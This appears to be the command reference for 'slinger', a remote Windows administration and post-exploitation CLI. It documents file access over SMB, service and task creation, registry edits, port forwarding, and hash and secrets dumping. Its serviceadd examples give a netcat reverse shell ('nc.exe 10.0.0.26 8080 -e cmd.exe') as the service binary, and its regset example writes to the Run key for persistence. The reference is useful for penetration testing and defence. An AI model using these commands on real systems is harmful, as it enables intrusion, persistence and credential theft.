# CLI Commands Documentation

## `use`

**Description:** Connect to a specific share on the remote server

**Help:**
```
use [-h] share
Connect to a specific share on the remote server
```

**Example Usage:**
```
Example Usage: use <sharename> | use C$
```

### Arguments

- **`share`**: Specify the share name to connect to
  - Required: Yes

---

## `ls`

**Description:** List contents of a directory at a specified path.  File paths with spaces must be entirely in quotes.

**Help:**
```
ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [-sr] [-l] [-r depth] [--type {f,d,a}] [path]
List contents of a directory at a specified path.  File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: ls /path/to/directory
ls --type f -l          # List only files in long format
ls --type d             # List only directories
ls --type f -r 2        # Recursively list only files to depth 2
```

### Arguments

- **`path`**: Path to list contents, defaults to current path
  - Default: `.`
  - Required: No

- **`sort`**: Sort the directory contents by name, size, or date
  - Choices: name, size, created, lastaccess, lastwrite
  - Default: `date`
  - Required: No

- **`recursive`**: Recursively list directory contents with X depth
  - Required: No

- **`type`**: Filter by type
  - Choices: f (files only), d (directories only), a (all)
  - Default: `a`
  - Required: No

---

## `shares`

**Description:** List all shares available on the remote server

**Help:**
```
shares [-h] [-l]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `find`

**Description:** Search for files and directories matching specified criteria with advanced filtering options

**Help:**
```
find [-h] [-type {f,d}] [-size SIZE] [-mtime DAYS] [-ctime DAYS] [-atime DAYS]
     [-maxdepth DEPTH] [-mindepth DEPTH] [-regex] [-iname] [-empty] [-hidden]
     [-progress] [-timeout SECONDS] [-o OUTPUT] [--limit LIMIT]
     [--format {table,json,list,paths}] pattern [path]
```

**Example Usage:**
```
find "*.exe" -type f --limit 10                 # Find first 10 .exe files
find "root*" -type f -timeout 30 -progress      # Find files starting with 'root' with 30s timeout
find "*" -type d --maxdepth 2                   # Find directories up to 2 levels deep
find "*.log" -size +1MB -mtime -30              # Find log files >1MB modified in last 30 days
find "backup*" -o results.txt                   # Save search results to file
```

### Arguments

- **`pattern`**: Search pattern (wildcards * and ? supported, or regex with -regex flag)
  - Required: Yes

- **`path`**: Starting directory for search (default: current directory)
  - Required: No

- **`-type`**: Filter by file type
  - Choices: f (files), d (directories)
  - Required: No

- **`-size`**: Filter by file size (e.g., +100MB, -1KB, =500B)
  - Required: No

- **`-timeout`**: Search timeout in seconds
  - Default: 120
  - Required: No

- **`-progress`**: Show verbose progress during search
  - Required: No

- **`--limit`**: Maximum number of results to return
  - Required: No

- **`--format`**: Output format for results
  - Choices: table, json, list, paths
  - Default: table
  - Required: No

- **`-o`**: Save results to specified file
  - Required: No

---

## `enumshares`

**Description:** List all shares available on the remote server

**Help:**
```
shares [-h] [-l]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `cat`

**Description:** Display the contents of a specified file on the remote server.  File paths with spaces must be entirely in quotes.

**Help:**
```
cat [-h] remote_path
Display the contents of a specified file on the remote server.  File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cat /path/to/file
```

### Arguments

- **`remote_path`**: Specify the remote file path to display contents
  - Required: Yes

---

## `cd`

**Description:** Change to a different directory on the remote server.  File paths with spaces must be entirely in quotes.

**Help:**
```
cd [-h] [path]
Change to a different directory on the remote server.  File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cd /path/to/directory
```

### Arguments

- **`path`**: Directory path to change to, defaults to current directory
  - Default: `.`
  - Required: No

---

## `pwd`

**Description:** Print the current working directory on the remote server

**Help:**
```
pwd [-h]
Print the current working directory on the remote server
```

**Example Usage:**
```
Example Usage: pwd
```

---

## `exit`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `quit`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logout`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logoff`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `clear`

**Description:** Clear the screen

**Help:**
```
clear [-h]
Clear the screen
```

**Example Usage:**
```
Example Usage: clear
```

---

## `help`

**Description:** Display help information for the application

**Help:**
```
help [-h] [cmd]
Display help information for the application
```

**Example Usage:**
```
Example Usage: help
```

### Arguments

- **`cmd`**: Specify a command to show help for
  - Required: No

---

## `who`

**Description:** List the current sessions connected to the target host

**Help:**
```
who [-h]
List the current sessions connected to the target host
```

**Example Usage:**
```
Example Usage: who
```

---

## `enumdisk`

**Description:** Enumerate server disk information

**Help:**
```
enumdisk [-h]
Enumerate server disk information
```

**Example Usage:**
```
Example Usage: enumdisk
```

---

## `enumlogons`

**Description:** Enumerate users currently logged on the server

**Help:**
```
enumlogons [-h]
Enumerate users currently logged on the server
```

**Example Usage:**
```
Example Usage: enumlogons
```

---

## `enuminfo`

**Description:** Enumerate detailed information about the remote host

**Help:**
```
enuminfo [-h]
Enumerate detailed information about the remote host
```

**Example Usage:**
```
Example Usage: enuminfo
```

---

## `enumsys`

**Description:** Enumerate system information of the remote host

**Help:**
```
enumsys [-h]
Enumerate system information of the remote host
```

**Example Usage:**
```
Example Usage: enumsys
```

---

## `enumtransport`

**Description:** Enumerate transport information of the remote host

**Help:**
```
enumtransport [-h]
Enumerate transport information of the remote host
```

**Example Usage:**
```
Example Usage: enumtransport
```

---

## `time`

**Description:** Get server time, date, timezone, and uptime

**Help:**
```
time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

### Aliases
- `enumtime` - Get server time and uptime information
- `servertime` - Display remote server time details

---

## `enumtime`

**Description:** Get server time, date, timezone, and uptime

**Help:**
```
time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: enumtime
```

---

## `servertime`

**Description:** Get server time, date, timezone, and uptime

**Help:**
```
time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: servertime
```

---

## `enumservices`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `servicesenum`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `svcenum`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `services`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `serviceshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `svcshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `showservice`

**Description:** Show details of a specific service on the remote server

**Help:**
```
serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `servicestart`

**Description:** Start a specified service on the remote server

**Help:**
```
servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `svcstart`

**Description:** Start a specified service on the remote server

**Help:**
```
servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicerun`

**Description:** Start a specified service on the remote server

**Help:**
```
servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicestop`

**Description:** Stop a specified service on the remote server

**Help:**
```
servicestop [-h] (-i SERVICEID | service_name)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `svcstop`

**Description:** Stop a specified service on the remote server

**Help:**
```
servicestop [-h] (-i SERVICEID | service_name)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `serviceenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `svcenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enableservice`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enablesvc`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `servicedisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `svcdisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disableservice`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disablesvc`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `servicedel`

**Description:** Delete a specified service on the remote server

**Help:**
```
servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `svcdelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `servicedelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `serviceadd`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svcadd`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `servicecreate`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svccreate`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n SERVICENAME -b BINARYPATH -d DISPLAYNAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`servicename`**: Specify the name of the new service
  - Required: Yes

- **`binarypath`**: Specify the binary path of the new service
  - Required: Yes

- **`displayname`**: Specify the display name of the new service
  - Required: Yes

- **`starttype`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `enumtasks`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
enumtasks [-h]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks
```

---

## `tasksenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
enumtasks [-h]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks
```

---

## `taskenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
enumtasks [-h]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks
```

---

## `taskshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
taskshow [-h] (-i TASKID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`taskid`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `tasksshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
taskshow [-h] (-i TASKID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`taskid`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `showtask`

**Description:** Show details of a specific task on the remote server

**Help:**
```
taskshow [-h] (-i TASKID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`taskid`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `taskcreate`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskadd`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskrun`

**Description:** Run a specified task on the remote server

**Help:**
```
taskrun [-h] task_path
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskexec`

**Description:** Run a specified task on the remote server

**Help:**
```
taskrun [-h] task_path
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskdelete`

**Description:** Delete a specified task on the remote server

**Help:**
```
taskdelete [-h] [-i TASKID] [task_path]
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`taskid`**: Specify the ID of the task to delete
  - Required: No

---

## `taskdel`

**Description:** Delete a specified task on the remote server

**Help:**
```
taskdelete [-h] [-i TASKID] [task_path]
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`taskid`**: Specify the ID of the task to delete
  - Required: No

---

## `taskrm`

**Description:** Delete a specified task on the remote server

**Help:**
```
taskdelete [-h] [-i TASKID] [task_path]
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`taskid`**: Specify the ID of the task to delete
  - Required: No

---

## `upload`

**Description:** Upload a file to the remote server

**Help:**
```
upload [-h] local_path [remote_path]
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `put`

**Description:** Upload a file to the remote server

**Help:**
```
upload [-h] local_path [remote_path]
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `download`

**Description:** Download a file from the remote server.  File paths with spaces must be entirely in quotes.

**Help:**
```
download [-h] remote_path [local_path]
Download a file from the remote server.  File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

---

## `get`

**Description:** Download a file from the remote server.  File paths with spaces must be entirely in quotes.

**Help:**
```
download [-h] remote_path [local_path]
Download a file from the remote server.  File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

---

## `mget`

**Description:** Download all files from a specified directory and its subdirectories.  File paths with spaces must be entirely in quotes.

**Help:**
```
mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
Download all files from a specified directory and its subdirectories.  File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: mget /remote/path /local/path
```

### Arguments

- **`remote_path`**: Specify the remote directory path to download from
  - Required: No

- **`local_path`**: Specify the local directory path where files will be downloaded
  - Required: No

- **`p`**: Specify a regex pattern to match filenames
  - Required: No

- **`d`**: Specify folder depth count for recursion
  - Default: `2`
  - Required: No

---

## `mkdir`

**Description:** Create a new directory on the remote server

**Help:**
```
mkdir [-h] path
Create a new directory on the remote server
```

**Example Usage:**
```
Example Usage: mkdir /path/to/new/directory
```

### Arguments

- **`path`**: Specify the path of the directory to create
  - Required: Yes

---

## `rmdir`

**Description:** Remove a directory on the remote server

**Help:**
```
rmdir [-h] remote_path
Remove a directory on the remote server
```

**Example Usage:**
```
Example Usage: rmdir /path/to/remote/directory
```

### Arguments

- **`remote_path`**: Specify the remote path of the directory to remove
  - Required: Yes

---

## `rm`

**Description:** Delete a file on the remote server

**Help:**
```
rm [-h] remote_path
Delete a file on the remote server
```

**Example Usage:**
```
Example Usage: rm /path/to/remote/file
```

### Arguments

- **`remote_path`**: Specify the remote file path to delete
  - Required: Yes

---

## `#shell`

**Description:** Enter local terminal mode for command execution

**Help:**
```
#shell [-h]
Enter local terminal mode for command execution
```

**Example Usage:**
```
Example Usage: #shell
```

---

## `!`

**Description:** Run a specified local command

**Help:**
```
! [-h] ...
Run a specified local command
```

**Example Usage:**
```
Example Usage: ! ls -l
```

### Arguments

- **`commands`**: Specify the local commands to run
  - Required: Yes

---

## `info`

**Description:** Display the status of the current session

**Help:**
```
info [-h]
Display the status of the current session
```

**Example Usage:**
```
Example Usage: info
```

---

## `reguse`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
reguse [-h]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstart`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
reguse [-h]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstop`

**Description:** Disconnect from a remote registry on the remote server

**Help:**
```
regstop [-h]
Disconnect from a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: regstop
```

---

## `regquery`

**Description:** Query a registry key on the remote server

**Help:**
```
regquery [-h] [-l] [-v] key
Query a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (You must use two slashes or quotes)
```

### Arguments

- **`key`**: Specify the registry key to query
  - Required: Yes

---

## `regset`

**Description:** Set a registry value on the remote server

**Help:**
```
regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
Set a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"
```

### Arguments

- **`key`**: Specify the registry key to set
  - Required: Yes

- **`value`**: Specify the registry value to set
  - Required: Yes

- **`data`**: Specify the registry data to set
  - Required: Yes

- **`type`**: Specify the registry type to set
  - Default: `REG_SZ`
  - Required: No

---

## `regdel`

**Description:** Delete a registry value on the remote server

**Help:**
```
regdel [-h] -k KEY [-v VALUE]
Delete a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test
```

### Arguments

- **`key`**: Specify the registry key to delete
  - Required: Yes

- **`value`**: Specify the registry value to delete
  - Required: No

---

## `regcreate`

**Description:** Create a registry key on the remote server

**Help:**
```
regcreate [-h] key
Create a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to create
  - Required: Yes

---

## `regcheck`

**Description:** Check if a registry key exists on the remote server.  This is really just an exposed helper function.

**Help:**
```
regcheck [-h] key
Check if a registry key exists on the remote server.  This is really just an exposed helper function.
```

**Example Usage:**
```
Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to check
  - Required: Yes

---

## `portfwd`

**Description:** Forward a local port to a remote port on the remote server

**Help:**
```
portfwd [-h] (-d | -a | -l | -c | --load) local remote
Forward a local port to a remote port on the remote server
```

**Example Usage:**
```
Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
```

### Arguments

- **`local`**: Specify the local host and port to forward from
  - Required: Yes

- **`remote`**: Specify the remote host and port to forward to
  - Required: Yes

---

## `ifconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `ipconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `enuminterfaces`

**Description:** Display network interfaces on the remote server

**Help:**
```
ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `hostname`

**Description:** Display the hostname of the remote server

**Help:**
```
hostname [-h]
Display the hostname of the remote server
```

**Example Usage:**
```
Example Usage: hostname
```

---

## `procs`

**Description:** List running processes on the remote server

**Help:**
```
procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `ps`

**Description:** List running processes on the remote server

**Help:**
```
procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `tasklist`

**Description:** List running processes on the remote server

**Help:**
```
procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `fwrules`

**Description:** Display firewall rules on the remote server

**Help:**
```
fwrules [-h]
Display firewall rules on the remote server
```

**Example Usage:**
```
Example Usage: fwrules
```

---

## `set`

**Description:** Set a variable for use in the application

**Help:**
```
set [-h] varname value
Set a variable for use in the application
```

**Example Usage:**
```
Example Usage: set varname value
```

### Arguments

- **`varname`**: Set the debug variable to True or False
  - Required: Yes

- **`value`**: Set the mode variable to True or False
  - Required: Yes

---

## `config`

**Description:** Show the current config

**Help:**
```
config [-h]
Show the current config
```

**Example Usage:**
```
Example Usage: config
```

---

## `run`

**Description:** Run a slinger script or command sequence

**Help:**
```
run [-h] (-c CMD_CHAIN | -f FILE)
Run a slinger script or command sequence
```

**Example Usage:**
```
Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
```

### Arguments

- **`cmd_chain`**: Specify a command sequence to run
  - Required: No

- **`file`**: Specify a script file to run
  - Required: No

---

## `hashdump`

**Description:** Dump hashes from the remote server

**Help:**
```
hashdump [-h]
Dump hashes from the remote server
```

**Example Usage:**
```
Example Usage: hashdump
```

---

## `secretsdump`

**Description:** Dump secrets from the remote server

**Help:**
```
secretsdump [-h]
Dump secrets from the remote server
```

**Example Usage:**
```
Example Usage: secretsdump
```

---

## `env`

**Description:** Display environment variables on the remote server

**Help:**
```
env [-h]
Display environment variables on the remote server
```

**Example Usage:**
```
Example Usage: env
```

---

